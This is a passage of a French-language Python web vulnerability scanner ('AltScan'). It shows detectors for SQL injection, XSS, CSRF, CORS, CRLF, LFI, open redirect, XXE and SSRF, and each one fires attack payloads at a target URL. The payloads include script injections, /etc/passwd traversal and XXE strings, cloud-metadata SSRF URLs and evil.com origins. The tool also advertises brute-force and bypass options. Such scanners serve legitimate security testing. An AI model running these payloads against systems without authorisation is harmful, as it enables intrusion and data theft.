        if not params:
            msg = "[INFO] Aucun paramètre GET à tester"
            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            return msg
        
        try:
            baseline_start = time.time()
            requests.get(url, timeout=15, verify=False)
            baseline_time = time.time() - baseline_start
            print(f"{Colors.CYAN}Temps de réponse baseline: {baseline_time:.2f}s{Colors.RESET}")
        except:
            baseline_time = 1.0
        
        for param in params:
            print(f"\n{Colors.CYAN}Test du paramètre: {param}{Colors.RESET}")
            
            for payload, expected_delay in time_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, test_query, parsed.fragment))
                
                try:
                    start_time = time.time()
                    requests.get(test_url, timeout=expected_delay + 5, verify=False)
                    elapsed_time = time.time() - start_time
                    
                    print(f"  Payload: {payload[:30]}... - Temps: {elapsed_time:.2f}s")
                    
                    if elapsed_time >= (baseline_time + expected_delay - 1):
                        msg = f"[VULNÉRABLE] Blind SQLi détectée sur {param} (délai: {elapsed_time:.2f}s)"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                        results.append(msg)
                        break
                except:
                    continue
            
            if results:
                break
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de Blind SQLi détectée{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune Blind SQLi détectée"

    def scan_xss_reflected(url):
        print(f"\n{Colors.CYAN}[*] Scan XSS Reflected{Colors.RESET}")
        results = []
        
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<svg><script>alert(1)</script></svg>"
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            msg = "[INFO] Aucun paramètre GET à tester"
            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            return msg
        
        for param in params:
            print(f"\n{Colors.CYAN}Test du paramètre: {param}{Colors.RESET}")
            
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, test_query, parsed.fragment))
                
                try:
                    r = requests.get(test_url, timeout=10, verify=False)
                    
                    if payload in r.text:
                        msg = f"[VULNÉRABLE] XSS détectée sur {param} - Payload reflété: {payload[:40]}"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                        results.append(msg)
                        break
                except:
                    continue
            
            if results:
                break
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de XSS reflétée détectée{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune XSS détectée"

    def scan_xss_stored(url):
        print(f"\n{Colors.CYAN}[*] Scan XSS Stored{Colors.RESET}")
        results = []
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            forms = soup.find_all("form")
            
            if not forms:
                msg = "[INFO] Aucun formulaire détecté"
                print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                return msg
            
            xss_test_payload = "<script>alert('XSS')</script>"
            
            for i, form in enumerate(forms):
                action = form.get("action", "")
                method = form.get("method", "get").lower()
                
                text_inputs = form.find_all(["input", "textarea"])
                
                if text_inputs:
                    msg = f"[INFO] Formulaire #{i+1} trouvé - Test manuel recommandé avec payload XSS"
                    print(f"{Colors.CYAN}{msg}{Colors.RESET}")
                    results.append(msg)
            
            if results:
                msg = "[ALERTE] Testez manuellement les formulaires pour XSS Stored"
                print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                results.append(msg)
                
        except Exception as e:
            msg = f"[!] Erreur: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "Aucun formulaire détecté"

    def scan_csrf(url):
        print(f"\n{Colors.CYAN}[*] Scan CSRF{Colors.RESET}")
        results = []
        
        try:
            r = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            forms = soup.find_all("form")
            
            if not forms:
                msg = "[INFO] Aucun formulaire détecté"
                print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                return msg
            
            csrf_tokens = [
                "csrf", "csrf_token", "_csrf", "csrftoken",
                "_token", "authenticity_token", "token"
            ]
            
            for i, form in enumerate(forms):
                has_csrf = False
                
                hidden_inputs = form.find_all("input", {"type": "hidden"})
                
                for hidden in hidden_inputs:
                    name = hidden.get("name", "").lower()
                    if any(token in name for token in csrf_tokens):
                        has_csrf = True
                        msg = f"[OK] Formulaire #{i+1} protégé par token CSRF: {name}"
                        print(f"{Colors.GREEN}{msg}{Colors.RESET}")
                        break
                
                if not has_csrf:
                    form_str = str(form).lower()
                    if any(keyword in form_str for keyword in ["password", "login", "email", "transfer", "delete"]):
                        msg = f"[VULNÉRABLE] Formulaire #{i+1} sensible SANS protection CSRF"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                        results.append(msg)
                    else:
                        msg = f"[INFO] Formulaire #{i+1} sans token CSRF (vérifier si sensible)"
                        print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            
        except Exception as e:
            msg = f"[!] Erreur: {str(e)}"
            print(f"{Colors.RED}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "Protection CSRF présente"

    def scan_cors_misconfiguration(url):
        print(f"\n{Colors.CYAN}[*] Scan CORS Misconfiguration{Colors.RESET}")
        results = []
        
        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null"
        ]
        
        for origin in test_origins:
            headers = {"Origin": origin}
            try:
                r = requests.get(url, headers=headers, timeout=10, verify=False)
                
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                
                if acao == "*":
                    msg = "[VULNÉRABLE] CORS: Access-Control-Allow-Origin = * (très permissif)"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
                    break
                elif acao == origin:
                    msg = f"[VULNÉRABLE] CORS: Origine malveillante acceptée: {origin}"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
                    
                    if acac.lower() == "true":
                        msg = "[CRITIQUE] CORS avec credentials activés pour origine malveillante"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                        results.append(msg)
                    break
                elif acao == "null":
                    msg = "[VULNÉRABLE] CORS: null origin accepté"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
                    break
                    
            except:
                continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Configuration CORS sécurisée{Colors.RESET}")
        
        return "\n".join(results) if results else "CORS correctement configuré"

    def scan_crlf_injection(url):
        print(f"\n{Colors.CYAN}[*] Scan CRLF Injection{Colors.RESET}")
        results = []
        
        crlf_payloads = [
            "%0d%0aSet-Cookie:test=injected",
            "%0aSet-Cookie:test=injected",
            "%0d%0aLocation:https://evil.com",
            "\r\nSet-Cookie:test=injected"
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            msg = "[INFO] Aucun paramètre GET à tester"
            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            return msg
        
        for param in params:
            print(f"\n{Colors.CYAN}Test du paramètre: {param}{Colors.RESET}")
            
            for payload in crlf_payloads:
                test_params = params.copy()
                test_params[param] = [test_params[param][0] + payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, test_query, parsed.fragment))
                
                try:
                    r = requests.get(test_url, timeout=10, verify=False, allow_redirects=False)
                    
                    if "Set-Cookie" in r.headers and "test=injected" in r.headers.get("Set-Cookie", ""):
                        msg = f"[VULNÉRABLE] CRLF Injection sur {param}"
                        print(f"{Colors.RED}{msg}{Colors.RESET}")
                        results.append(msg)
                        break
                        
                    if "set-cookie" in r.text.lower() and "injected" in r.text.lower():
                        msg = f"[POTENTIEL] CRLF Injection possible sur {param}"
                        print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
                        results.append(msg)
                        break
                except:
                    continue
            
            if results:
                break
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de CRLF Injection détectée{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune CRLF Injection détectée"

    def scan_lfi(url):
        print(f"\n{Colors.CYAN}[*] Scan Local File Inclusion (LFI){Colors.RESET}")
        results = []
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "../../../../../../etc/passwd%00",
            "....//....//....//....//etc/passwd"
        ]
        
        lfi_indicators = [
            "root:x:", "daemon:", "www-data:",
            "[fonts]", "[extensions]", "# localhost"  
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            msg = "[INFO] Aucun paramètre GET à tester"
            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            return msg
        
        for param in params:
            print(f"\n{Colors.CYAN}Test du paramètre: {param}{Colors.RESET}")
            
            for payload in lfi_payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, test_query, parsed.fragment))
                
                try:
                    r = requests.get(test_url, timeout=10, verify=False)
                    
                    for indicator in lfi_indicators:
                        if indicator in r.text:
                            msg = f"[VULNÉRABLE] LFI détectée sur {param} avec payload: {payload}"
                            print(f"{Colors.RED}{msg}{Colors.RESET}")
                            results.append(msg)
                            break
                    
                    if results:
                        break
                except:
                    continue
            
            if results:
                break
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de LFI détectée{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune LFI détectée"

    def scan_open_redirect(url):
        print(f"\n{Colors.CYAN}[*] Scan Open Redirect{Colors.RESET}")
        results = []
        
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "javascript:alert(1)",
            "https://google.com"
        ]
        
        redirect_params = ["redirect", "url", "next", "return", "returnUrl", "goto", "redir"]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            if any(redir in param.lower() for redir in redirect_params):
                print(f"\n{Colors.CYAN}Test du paramètre: {param}{Colors.RESET}")
                
                for payload in redirect_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                        parsed.params, test_query, parsed.fragment))
                    
                    try:
                        r = requests.get(test_url, timeout=10, verify=False, allow_redirects=False)
                        
                        if r.status_code in [301, 302, 303, 307, 308]:
                            location = r.headers.get("Location", "")
                            if payload in location or "evil.com" in location or "google.com" in location:
                                msg = f"[VULNÉRABLE] Open Redirect sur {param} vers: {location}"
                                print(f"{Colors.RED}{msg}{Colors.RESET}")
                                results.append(msg)
                                break
                    except:
                        continue
                
                if results:
                    break
        
        if not params and not results:
            for param in redirect_params:
                test_url = f"{url}?{param}=https://evil.com"
                try:
                    r = requests.get(test_url, timeout=10, verify=False, allow_redirects=False)
                    if r.status_code in [301, 302, 303, 307, 308]:
                        location = r.headers.get("Location", "")
                        if "evil.com" in location:
                            msg = f"[VULNÉRABLE] Open Redirect avec paramètre {param}"
                            print(f"{Colors.RED}{msg}{Colors.RESET}")
                            results.append(msg)
                            break
                except:
                    continue
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas d'Open Redirect détectée{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune redirection ouverte détectée"

    def scan_xxe(url):
        print(f"\n{Colors.CYAN}[*] Scan XXE{Colors.RESET}")
        results = []
        
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <root>
        <data>&xxe;</data>
    </root>"""
        
        try:
            headers = {"Content-Type": "application/xml"}
            r = requests.post(url, data=xxe_payload, headers=headers, timeout=10, verify=False)
            
            xxe_indicators = ["root:x:", "daemon:", "www-data:"]
            
            for indicator in xxe_indicators:
                if indicator in r.text:
                    msg = "[VULNÉRABLE] XXE détectée - Fichier /etc/passwd accessible"
                    print(f"{Colors.RED}{msg}{Colors.RESET}")
                    results.append(msg)
                    break
            
            if not results:
                msg = "[INFO] Test XXE effectué - Pas de vulnérabilité évidente"
                print(f"{Colors.GREEN}{msg}{Colors.RESET}")
                
        except Exception as e:
            msg = f"[INFO] XXE non testable sur cette URL (méthode POST requise)"
            print(f"{Colors.YELLOW}{msg}{Colors.RESET}")
            return msg
        
        return "\n".join(results) if results else "Aucune XXE détectée"

    def scan_ssrf(url):
        """Scanner 40: SSRF (Server-Side Request Forgery)"""
        print(f"\n{Colors.CYAN}[*] Scan SSRF{Colors.RESET}")
        results = []
        
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://[::1]", 
            "http://0.0.0.0"
        ]
        
        url_params = ["url", "uri", "path", "link", "src", "source", "target"]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            if any(up in param.lower() for up in url_params):
                print(f"\n{Colors.CYAN}Test du paramètre: {param}{Colors.RESET}")
                
                for payload in ssrf_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                        parsed.params, test_query, parsed.fragment))
                    
                    try:
                        r = requests.get(test_url, timeout=10, verify=False)
                        
                        ssrf_indicators = [
                            "ami-id", "instance-id",
                            "metadata", "computeMetadata", 
                            "localhost", "127.0.0.1"
                        ]
                        
                        for indicator in ssrf_indicators:
                            if indicator in r.text:
                                msg = f"[VULNÉRABLE] SSRF potentielle sur {param} avec: {payload}"
                                print(f"{Colors.RED}{msg}{Colors.RESET}")
                                results.append(msg)
                                break
                        
                        if results:
                            break
                    except:
                        continue
                
                if results:
                    break
        
        if not results:
            print(f"{Colors.GREEN}[+] Pas de SSRF détectée{Colors.RESET}")
        
        return "\n".join(results) if results else "Aucune SSRF détectée"

    def show_main_menu():
        scanner = """
                             █████╗ ██╗     ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
                            ██╔══██╗██║     ╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
                            ███████║██║        ██║       ███████╗██║     ███████║██╔██╗ ██║
                            ██╔══██║██║        ██║       ╚════██║██║     ██╔══██║██║╚██╗██║
                            ██║  ██║███████╗   ██║       ███████║╚██████╗██║  ██║██║ ╚████║
                            ╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
        """
        print_violet_white_gradient(scanner)
        
        by = """
        < [V] 1.9.1                                                     By AltWolf
        < [Creator] Team AltSad                                          AltT00l
        """
        print_violet_white_gradient(by)
        
        print(f"""
                {Colors.MAGENTA}Scanner-option1                          Scanner-option2                          Scanner-option3{Colors.RESET}
    {Colors.MAGENTA}┌──────────────────────────────────┐ ┌──────────────────────────────────┐ ┌──────────────────────────────────┐{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(01){Colors.WHITE} > Traefik                   {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(12){Colors.WHITE} > auth-bypass               {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(23){Colors.WHITE} > Securiy-headers           {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(02){Colors.WHITE} > STrace                    {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(13){Colors.WHITE} > exposed-admin             {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(24){Colors.WHITE} > Abscence de Captcha       {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(03){Colors.WHITE} > Js-debug                  {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(14){Colors.WHITE} > jwt-role                  {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(25){Colors.WHITE} > debug-headers             {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(04){Colors.WHITE} > html-com                  {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(15){Colors.WHITE} > jQuery XSS                {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(26){Colors.WHITE} > dev-directorie            {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(05){Colors.WHITE} > js_secrets                {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(16){Colors.WHITE} > client-side               {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(27){Colors.WHITE} > http-methods              {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(06){Colors.WHITE} > cms_expo                  {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(17){Colors.WHITE} > hidden-param              {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(28){Colors.WHITE} > Abs-Verif-auto            {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(07){Colors.WHITE} > API-leak                  {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(18){Colors.WHITE} > Scanner                   {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(29){Colors.WHITE} > error-handling            {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(08){Colors.WHITE} > sql-dump                  {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(19){Colors.WHITE} > Direct-object             {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(30){Colors.WHITE} > Attack                    {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(09){Colors.WHITE} > backup-file               {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(20){Colors.WHITE} > unauthorized-access       {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(31){Colors.WHITE} > Blind SQL                 {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(10){Colors.WHITE} > Logs-expo                 {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(21){Colors.WHITE} > Directory-list            {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(32){Colors.WHITE} > Brute-force login         {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(11){Colors.WHITE} > Idor-detect               {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(22){Colors.WHITE} > Sensitive_files           {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(33){Colors.WHITE} > Bypass-ID                 {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}└──────────────────────────────────┘ └──────────────────────────────────┘ │{Colors.RESET}                  {Colors.MAGENTA}                │{Colors.RESET}
                                                                            {Colors.MAGENTA}└──────────────────────────────────┘{Colors.RESET}

                {Colors.MAGENTA}Scanner-option4                          Options{Colors.RESET}
    {Colors.MAGENTA}┌──────────────────────────────────┐ ┌──────────────────────────────────┐{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(34){Colors.WHITE} > CSRF                      {Colors.MAGENTA}│ │{Colors.RESET} {Colors.GREEN}(99){Colors.WHITE} > Scanner-Complet           {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(35){Colors.WHITE} > CORS-Misconfiguration     {Colors.MAGENTA}│ │{Colors.RESET} {Colors.CYAN}(S ){Colors.WHITE} > Paramètres                {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(36){Colors.WHITE} > CRLF-Injection            {Colors.MAGENTA}│ │{Colors.RESET} {Colors.RED}(0 ){Colors.WHITE} > Quitter                   {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(37){Colors.WHITE} > LFI                       {Colors.MAGENTA}│ └──────────────────────────────────┘{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(38){Colors.WHITE} > Open-Redirect             {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(39){Colors.WHITE} > XXE                       {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}│{Colors.RESET} {Colors.CYAN}(40){Colors.WHITE} > SSRF                      {Colors.MAGENTA}│{Colors.RESET}
    {Colors.MAGENTA}└──────────────────────────────────┘{Colors.RESET}
    """)

    def run_scanner(choice, url):
        scanners = {
            "1": ("Traefik Dashboard", scan_traefik_dashboard),
            "2": ("Stack Traces", scan_stacktrace),
            "3": ("Debug JavaScript", scan_js_debug),
            "4": ("Commentaires HTML", scan_html_comments),
            "5": ("Secrets JavaScript", scan_js_secrets),
            "6": ("Versions CMS", scan_cms_version),
            "7": ("Endpoints API", scan_api_endpoints),
            "8": ("Dumps Database", scan_database_dumps),
            "9": ("Fichiers Backup", scan_backup_files),
            "10": ("Fichiers Logs", scan_log_files),
            "11": ("IDOR", scan_idor),
            "12": ("Auth Bypass", scan_auth_bypass),
            "13": ("Endpoints Admin", scan_admin_endpoints),
            "14": ("JWT Issues", scan_jwt_issues),
            "15": ("Version jQuery", scan_jquery_version),
            "16": ("Contrôles Client", scan_client_side_controls),
            "17": ("Paramètres Cachés", scan_hidden_parameters),
            "18": ("SMTP Injection", scan_smtp_injection),
            "19": ("Direct Object Access", scan_direct_object_access),
            "20": ("Unauthorized Access", scan_unauthorized_access),
            "21": ("Directory Listing", scan_directory_listing),
            "22": ("Fichiers Sensibles", scan_sensitive_files),
            "23": ("Security Headers", scan_security_headers),
            "24": ("Absence CAPTCHA", scan_captcha_absence),
            "25": ("Debug Headers", scan_debug_headers),
            "26": ("Répertoires Dev", scan_dev_directories),
            "27": ("Méthodes HTTP", scan_http_methods),
            "28": ("Absence Auth", scan_missing_authentication),
            "29": ("Gestion Erreurs", scan_error_handling),
            "30": ("SQL Injection Error", scan_sql_injection_error_based),
            "31": ("SQL Injection Blind", scan_sql_injection_blind),
            "32": ("XSS Reflected", scan_xss_reflected),
            "33": ("XSS Stored", scan_xss_stored),
            "34": ("CSRF", scan_csrf),
            "35": ("CORS Misconfig", scan_cors_misconfiguration),
            "36": ("CRLF Injection", scan_crlf_injection),
            "37": ("LFI", scan_lfi),
            "38": ("Open Redirect", scan_open_redirect),
            "39": ("XXE", scan_xxe),
            "40": ("SSRF", scan_ssrf),
        }
        
        if choice in scanners:
            name, func = scanners[choice]
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}Démarrage: {name}{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            
            results = func(url)
            
            save = input(f"\n{Colors.YELLOW}Sauvegarder le rapport? (o/n): {Colors.RESET}").strip().lower()
            if save == 'o':
                save_report(name.replace(" ", "_").lower(), url, results)
            
            return results
        
        return None

    def run_full_scan(url):
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}SCAN COMPLET - Exécution de tous les tests{Colors.RESET}")
        print(f"{Colors.CYAN}Mode: {config.threads} threads | Rate limit: {config.rate_limit}s{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        
        all_results = []
        
        scanners = [
            ("Traefik Dashboard", scan_traefik_dashboard),
            ("Stack Traces", scan_stacktrace),
            ("Debug JavaScript", scan_js_debug),
            ("Commentaires HTML", scan_html_comments),
            ("Secrets JavaScript", scan_js_secrets),
            ("Versions CMS", scan_cms_version),
            ("Endpoints API", scan_api_endpoints),
            ("Dumps Database", scan_database_dumps),
            ("Fichiers Backup", scan_backup_files),
            ("Fichiers Logs", scan_log_files),
            ("IDOR", scan_idor),
            ("Auth Bypass", scan_auth_bypass),
            ("Endpoints Admin", scan_admin_endpoints),
            ("JWT Issues", scan_jwt_issues),
            ("Version jQuery", scan_jquery_version),
            ("Contrôles Client", scan_client_side_controls),
            ("Paramètres Cachés", scan_hidden_parameters),
            ("SMTP Injection", scan_smtp_injection),
            ("Direct Object Access", scan_direct_object_access),
            ("Unauthorized Access", scan_unauthorized_access),
            ("Directory Listing", scan_directory_listing),
            ("Fichiers Sensibles", scan_sensitive_files),
            ("Security Headers", scan_security_headers),
            ("Absence CAPTCHA", scan_captcha_absence),
            ("Debug Headers", scan_debug_headers),
            ("Répertoires Dev", scan_dev_directories),
            ("Méthodes HTTP", scan_http_methods),
            ("Absence Auth", scan_missing_authentication),
            ("Gestion Erreurs", scan_error_handling),
            ("SQL Injection Error", scan_sql_injection_error_based),
            ("SQL Injection Blind", scan_sql_injection_blind),
            ("XSS Reflected", scan_xss_reflected),
            ("XSS Stored", scan_xss_stored),
            ("CSRF", scan_csrf),
            ("CORS Misconfig", scan_cors_misconfiguration),
            ("CRLF Injection", scan_crlf_injection),
            ("LFI", scan_lfi),
            ("Open Redirect", scan_open_redirect),
            ("XXE", scan_xxe),
            ("SSRF", scan_ssrf),
        ]
        
        if config.threads > 1:
            with ThreadPoolExecutor(max_workers=config.threads) as executor:
                future_to_scanner = {executor.submit(func, url): name for name, func in scanners}
                
                for future in as_completed(future_to_scanner):
                    name = future_to_scanner[future]
                    try:
                        result = future.result()
                        all_results.append(f"\n{'='*60}\n{name}\n{'='*60}\n{result}")
                        log_message(f"Terminé: {name}", "SUCCESS")
                    except Exception as e:
                        log_message(f"Erreur {name}: {str(e)}", "ERROR")
        else:
            for name, func in scanners:
                log_message(f"→ {name}...", "INFO")
                result = func(url)
                all_results.append(f"\n{'='*60}\n{name}\n{'='*60}\n{result}")
        
        full_report = "\n".join(all_results)
        
        save_report("scan_complet", url, full_report)
        
        print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.GREEN}SCAN COMPLET TERMINÉ - 40 tests effectués{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")


    def show_settings_menu():
        while True:
            clear_screen()
            scanner = """
                             █████╗ ██╗     ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
                            ██╔══██╗██║     ╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
                            ███████║██║        ██║       ███████╗██║     ███████║██╔██╗ ██║
                            ██╔══██║██║        ██║       ╚════██║██║     ██╔══██║██║╚██╗██║
                            ██║  ██║███████╗   ██║       ███████║╚██████╗██║  ██║██║ ╚████║
                            ╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
            """
            print_violet_white_gradient(scanner)
            
            by = """
            < [V] 1.9.1                                                     By AltWolf
            < [Creator] Team AltSad                                          AltT00l
            """
            print_violet_white_gradient(by)
            
            print(f"""{Colors.MAGENTA}
    ╔═══════════════════════════ PARAMÈTRES ═══════════════════════════╗{Colors.RESET}
    {Colors.WHITE}║                                                                  ║{Colors.RESET}
    {Colors.WHITE}║  Mode Verbose:      {Colors.YELLOW}{str(config.verbose).ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Mode Silent:       {Colors.YELLOW}{str(config.silent).ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Threads:           {Colors.YELLOW}{str(config.threads).ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Timeout:           {Colors.YELLOW}{str(config.timeout).ljust(43)}s  {Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Rate Limit:        {Colors.YELLOW}{str(config.rate_limit).ljust(43)}s  {Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Proxy:             {Colors.YELLOW}{str(config.proxy or 'None').ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Format:            {Colors.YELLOW}{config.output_format.ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║                                                                  ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[1]{Colors.WHITE} > Toggle Verbose                                             ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[2]{Colors.WHITE} > Toggle Silent                                              ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[3]{Colors.WHITE} > Modifier Threads                                           ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[4]{Colors.WHITE} > Modifier Timeout                                           ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[5]{Colors.WHITE} > Modifier Rate Limit                                        ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[6]{Colors.WHITE} > Configurer Proxy                                           ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[7]{Colors.WHITE} > Changer Format (txt/json/html)                             ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.RED}[0]{Colors.WHITE} > Retour                                                     ║{Colors.RESET}
    {Colors.WHITE}║                                                                   ║{Colors.RESET}
    {Colors.MAGENTA}╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
            """)
            
